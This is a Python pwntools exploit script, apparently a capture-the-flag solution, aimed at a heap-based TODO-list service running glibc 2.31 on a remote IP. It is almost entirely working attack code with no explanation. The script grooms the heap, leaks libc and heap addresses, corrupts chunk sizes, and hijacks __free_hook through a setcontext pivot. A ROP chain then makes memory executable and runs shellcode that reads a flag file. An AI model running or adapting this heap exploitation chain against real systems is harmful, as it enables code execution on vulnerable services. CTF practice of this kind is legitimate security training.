from pwn import *

context.arch = 'amd64'

###Util
def newtask(num,data):
    if type(num)==type(0):
        num = str(num)
    num = num.encode()
    if type(data)==type(''):
        data = data.encode()
    r.sendline(b'1\n'+num+b','+data)
    r.recvuntil('(time,name) : ')

def newtodo(idx,data):
    #r.sendlineafter('choice : ','2')
    #r.sendlineafter('ID : ',str(idx))
    #r.sendlineafter(' : ',data)
    if type(data)==type(''):
        data = data.encode()
    r.sendline(b'2\n'+str(idx).encode()+b'\n'+data)
    r.recvuntil(f'TODO {idx} : ')

def delete():
    r.sendlineafter('choice : ','3')
    r.recvuntil('TODO(s) : \n')
    entries = []
    while True:
        res = r.recvline()
        if res==b'All Done...\n':
            break
        entries.append(res[:-1].split(b') ')[1])
    return entries

def show():
    r.sendlineafter('choice : ','4')
    r.recvuntil('task(s) : \n')
    res = []
    for i in range(3):
        res.append(r.recvline()[:-1].split(b') ')[1])
    return res

def scanf_consolidate():
    r.sendlineafter('choice : ','1'*0x400)

def setdata(payload):
    delete()
    newtask(0,payload)
    delete()
    newtask(0,'M30W')

###Addr
#  libc2.31(Ubuntu)
gets_offset = 0x86ad0+0x20
getchar_offset = 0x8e6c0+0x20
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x1eeb28

###ROPgadget
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162866
L_pop_rax = 0x4a550
L_pop_rcx_rbx = 0x1056fe
L_xor_eax_ecx = 0x4aefc
L_syscall = 0x66229
L_nop = 0x3491f
setcontext_gadget = 0x580dd
L_setrdx_call = 0x154930
'''
mov rdx,QWORD PTR [rdi+0x8]
mov QWORD PTR [rsp],rax
call QWORD PTR [rdx+0x20]
'''

###Exploit
while True:
    #r = process('./S',env={'LD_PRELOAD':'/tmp2/b05902008/STACK/libc-2.31.so'})
    r = remote('3.236.87.161',10101)
    newtask(0,'M30W')

    for i in range(6,-1,-1):
        print(f'{7-i}/7')
        newtodo(i,'M30W')
    for i in range(0x820//0x20,9,-8):
        print(f'{i}/{0x820//0x20//8}')
        newtodo(i-1,'M30W')
        for j in range(i-8,i-1):
            newtodo(j,'M30W')
    newtodo(8,'M30W')
    newtodo(7,'M30W')
    delete()

    newtask(0,b'a'*0x18+p64(((1<<64)-(0x1200-0x290-0x6c0))|1)+b'\x28')

    cnt = 7
    for i in range((0x1010-(0x290+0x6c0))//0x20):
        print(i)
        newtodo(cnt,'M30W')
        cnt+=1

    newtodo(191,'guard_target_fd/bk')
    newtodo(193,'target_fd/bk')
    for i in range((0x820-(0x1010-(0x290+0x6c0)+0x40))//0x20):
        print(i)
        newtodo(cnt,'M30W')
        cnt+=1


    REMAINSLOT = (((0x100-((0x290+0x6c0+0x820+0x50)&0xff))&0xff)//0x20)-1
    for i in range(REMAINSLOT):
        newtodo(i,'fastbin')

    newtodo(192,'guard_target')
    newtodo(194,'target')
    newtodo(195,'adjust_target_size')
    newtodo(196,'adjust_target_size')
    newtodo(6,'fastbin')
    newtodo(190,'guard_unsorted')
    newtodo(197,'unsorted')
    newtodo(198,'adjust_unsorted_size')
    newtodo(199,'adjust_unsorted_size')
    newtodo(5,b'fastbin')
    for i in range(REMAINSLOT,5):
        newtodo(i,'fastbin')

    delete()
    scanf_consolidate()

    try:
        newtask('0'*0x6e0,b'a'*0x40+p64((1<<64)-(0x1200-0x290-0x6c0)))
        leaks = show()
        unsorted_bin_addr = u64(leaks[1][0x20:]+b'\x00\x00')
        libc_base = unsorted_bin_addr-unsorted_bin_offset
        print(hex(libc_base))
        break
    except:
        r.close()

for i in range(7,1,-1):
    print(i)
    setdata(b'a'*(0x18+i))
setdata(b'a'*0x18+b'\x71')
newtodo(7,p64(0x70)+p64(0x30))
for i in range(6):
    print(i)
    newtodo(i+1,'M30W')
newtodo(0,'M30W')
delete()

newtask(0,b'M30W')
newtodo(7,p64(0x70)+p64(0x30))
for i in range(4):
    print(i)
    newtodo(i+1,'M30W')
newtodo(9,'0x260')
newtodo(6,'M30W')
newtodo(0,'controllable1')#0x210
newtodo(8,'controllable2')#0x230
newtodo(10,'size=0x30')
newtodo(5,'M30W')
delete()

newtask(0,'M30W')
setdata(b'a'*0x40)
for i in range(7,1,-1):
    print(i)
    setdata(b'a'*(0x38+i))
setdata(b'a'*0x38+b'\x21')
for i in range(7,1,-1):
    print(i)
    setdata(b'a'*(0x18+i))
setdata(b'a'*0x18+b'\x31')

newtodo(7,'M30W')
for i in range(5):
    print(i)
    newtodo(i,'M30W')
newtodo(5,p64(0))
newtodo(6,'M30W')

heap_addr = u64(delete()[5].ljust(8,b'\x00'))-0x1230
print(hex(heap_addr))

newtask(0,'M30W')
setdata(b'a'*0x37)
setdata(b'a'*0x30+p64(libc_base+setcontext_gadget))
setdata(b'a'*0x2f)
setdata(b'a'*0x28+p64(libc_base+gets_offset))
setdata(b'a'*0x27)
setdata(b'a'*0x20+p64(heap_addr+0x11b0))
setdata(b'a'*0x1f)
setdata(b'a'*0x18+p64(libc_base+L_pop_rdi))
setdata(b'a'*0x17)
setdata(b'a'*0x10+p64(libc_base+getchar_offset))
delete()
newtask(0,'M30W')

setdata(b'a'*0x20+p64(heap_addr+0x1230))
for i in range(7,1,-1):
    print(-4,i)
    setdata(b'a'*(0x18+i))
setdata(b'a'*0x18+b'\x21')

for i in range(5):
    print(-3,i)
    newtodo(i+1,'M30W')
newtodo(0,'M30W')
newtodo(8,'M30W')
newtodo(6,'M30W')
newtodo(7,'M30W')

setdata(b'a'*0x40+p64(libc_base+free_hook_offset-0x10))
for i in range(7,-1,-1):
    print(-2,i)
    setdata(b'a'*(0x38+i))
setdata(b'a'*0x38+b'\x21')
setdata(b'a'*0x27)
setdata(b'a'*0x20+p64(libc_base+L_setrdx_call))

newtodo(0,p64(0)+p64(heap_addr+0x1190))
for i in range(6):
    print(-1,i)
    newtodo(i+1,'M30W')
newtodo(7,p64(heap_addr+0x1190)+p64(libc_base+L_nop))

r.sendlineafter('choice : ','3')
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr+0x1000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(11)+\
           p64(libc_base+L_pop_rcx_rbx)+p64(1)+p64(0)+\
           p64(libc_base+L_xor_eax_ecx)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0x11b0+0x78)
shellcode = asm(f'''
                 mov rdi, {heap_addr+0x11b0+0x78+0x80}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {heap_addr+0x11b0+0x78+0x80}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {heap_addr+0x11b0+0x78+0x80}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 mov rdi, 0
                 mov rax, 0x3c
                 syscall
                 ''')
arguments = b'/home/STACK/flag\x00'
payload = ROPchain+shellcode.ljust(0x80,b'\x00')+arguments
r.sendline(payload)

r.interactive()
